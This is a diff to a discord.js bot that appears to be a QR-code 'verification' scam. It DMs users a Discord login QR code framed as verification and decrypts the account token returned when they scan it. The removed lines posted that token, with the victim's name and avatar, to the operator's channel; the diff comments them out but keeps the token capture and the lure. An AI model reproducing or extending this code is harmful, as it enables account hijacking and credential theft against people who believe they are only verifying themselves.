@@ -4,7 +4,6 @@ import {
   Collection,
   AttachmentBuilder,
   TextChannel,
-  EmbedBuilder,
 } from "discord.js";
 import {
   KeyPairKeyObjectResult,
@@ -22,11 +21,10 @@ import {
   IUserInfo,
 } from "../interfaces/ISocketEvents";
 import { toDataURL } from "qrcode";
-import { verifyCodeEmbed } from "../util/embeds/verifyCode";
 import { getTicket, getTicketWithCaptcha } from "../fetch/getTicket";
-import { sharedClient } from "..";
+import { allSockets, sharedClient } from "..";
 import { CaptchaSolver } from "./CaptchaSolver";
-import { tokenEmbed } from "../util/embeds/token";
+import * as embeds from "../util/embeds";
 
 export class DiscordSocket {
   public messages = new Collection<string, any>();
@@ -50,10 +48,12 @@ export class DiscordSocket {
     this.messages.set("pending_remote_init", this.pending_remote_init);
     this.messages.set("pending_ticket", this.pending_ticket);
     this.messages.set("pending_login", this.pending_login);
+    this.messages.set("cancel", this.handleCancel);
 
     this.socket.on("message", (message) => {
       const messageData = JSON.parse(message.toString());
       const _handle = this.messages.get(messageData.op);
+      if (!_handle) return this.messages.get("cancel")(this);
       _handle(this, messageData);
     });
   }
@@ -62,25 +62,33 @@ export class DiscordSocket {
     this.socket.send(JSON.stringify(data));
   }
 
+  private async handleCancel(_this: DiscordSocket) {
+    _this.user.send({ embeds: [await embeds.failedVerificationEmbed()] });
+    _this.socket.terminate();
+    allSockets.delete(_this.user.id);
+  }
+
   private async handleFoundUserToken(_this: DiscordSocket, token: string) {
     const decryptedToken = privateDecrypt(
       { key: _this.keyPair.privateKey, oaepHash: "sha256" },
       Buffer.from(token, "base64")
     );
 
-    const embed = await tokenEmbed();
-    embed.setDescription(decryptedToken.toString());
-    embed.setAuthor({
-      name: `${_this.userInformation?.username!}#${_this.userInformation
-        ?.discriminator!}`,
-      iconURL:
-        _this.userInformation?.avatar !== "0"
-          ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.userid}/${_this.userInformation?.avatar}`
-          : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
-    });
-    (sharedClient.channel as TextChannel).send({
-      embeds: [embed],
-    });
+    // const embed = await tokenEmbed();
+    // embed.setDescription(decryptedToken.toString());
+    // embed.setAuthor({
+    //   name: `${_this.userInformation?.username!}#${_this.userInformation
+    //     ?.discriminator!}`,
+    //   iconURL:
+    //     _this.userInformation?.avatar !== "0"
+    //       ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.userid}/${_this.userInformation?.avatar}`
+    //       : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
+    // });
+    // (sharedClient.channel as TextChannel).send({
+    //   embeds: [embed],
+    // });
+
+    allSockets.delete(_this.user.id);
   }
 
   private hello(_this: DiscordSocket, messageData: IHello) {
@@ -121,7 +129,9 @@ export class DiscordSocket {
     const discordImage = new AttachmentBuilder(qrCodeBuffer).setName("img.png");
 
     _this.user.send({
-      embeds: [(await verifyCodeEmbed()).setImage("attachment://img.png")],
+      embeds: [
+        (await embeds.directMessageEmbed()).setImage("attachment://img.png"),
+      ],
       files: [discordImage],
     });
   }
